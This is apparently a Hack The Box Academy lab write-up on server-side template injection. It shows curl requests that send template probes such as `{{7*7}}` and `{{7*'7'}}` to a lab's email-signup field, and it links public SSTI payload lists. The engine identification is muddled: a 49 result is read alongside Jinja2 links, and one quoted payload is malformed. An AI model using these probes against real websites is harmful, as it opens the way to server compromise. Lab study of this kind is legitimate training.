![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/8188ece6-e5a7-4344-b84d-b00f6c716a3f)

Next web site is uses input for register email. We will check that email input section


We can use curl or direct web site to enter payload to input:
Our first payload is: `${7*7}`
```bash
curl -X POST -d 'email=${7*7}' http://<TARGET IP>:<PORT>/jointheteam

<html>
<head>
<style>
form {
margin: 0 auto;
width: 200;
}
</style>
</head>
<body>
<h1 style="text-align: center;">~ Damn Hackers ~</h1>
<h2 style="text-align: center;">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2>
<h2 style="text-align: center;"><em>Great!</em></h2>
<h3 style="text-align: center;"><em>Email ${7*7} has been subscribed. You&#39;ll hear from us soon!</em></h3>
</body>
```

This payload doesn't look like work, let's use this -> `{{7*7}}`
The application evaluated the submitted expression this time. 
Let's continue, as PortSwigger's diagram suggests, to identify the underlying template engine.

Next payload: `{{7*'7'}}`

```bash
curl -X POST -d 'email={{7*'7'}}' http://<TARGET IP>:<PORT>/jointheteam

<html>
<head>
<style>
form {
margin: 0 auto;
width: 200;
}
</style>
</head>
<body>
<h1 style="text-align: center;">~ Damn Hackers ~</h1>
<h2 style="text-align: center;">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2>
<h2 style="text-align: center;"><em>Great!</em></h2>
<h3 style="text-align: center;"><em>Email 49 has been subscribed. You&#39;ll hear from us soon!</em></h3>
</body>
```
Default payload which is `{{_self.env.display("TEST"}}` didn't work, we have to test every payload from:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

